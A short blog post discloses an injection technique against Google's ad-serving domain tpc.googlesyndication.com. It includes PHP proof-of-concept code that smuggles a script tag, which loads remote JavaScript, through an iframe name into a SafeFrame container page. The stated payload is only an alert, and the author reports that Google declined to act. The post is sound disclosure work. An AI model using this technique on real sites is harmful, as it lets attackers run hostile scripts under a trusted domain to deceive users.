---
title: Embed any HTML into tpc.googlesyndication.com
layout: post
keywords: html xss cross site scripting tpc.googlesyndication.com google
---

Google uses <a href="http://tpc.googlesyndication.com" target="_blank" rel="nofollow">tpc.googlesyndication.com</a> for its adserving. They basically allow anything to run on this domain. There is a container html file hosted on this domain which reads the name of the iframe and injects the name content into the page. We can use this to run anything we want on this google domain.

Example php code:
{% highlight php %}
<?php

$html = '<script src="http://dubbelboer.com/googlebug/exploit.js"></script>';

// The format for the name needs to be "1-0-1;<length of content>;<content>"
echo '<iframe name="1-0-1;' . strlen($html) . ';' . htmlentities($html) . '"';
echo ' src="http://tpc.googlesyndication.com/safeframe/1-0-1/html/container.html"></iframe>';
{% endhighlight %}

This example can be found at <a href="http://dubbelboer.com/googlebug/index.php" target="_blank">http://dubbelboer.com/googlebug/index.php</a>

In my example `exploit.js` just contains an alert statement to show the domain. In theory this could contain any code.

This has been reported to google but they said they don't care what is run on the domain. I guess they never place any sensitive cookies on this domain and don't expect others to do either.

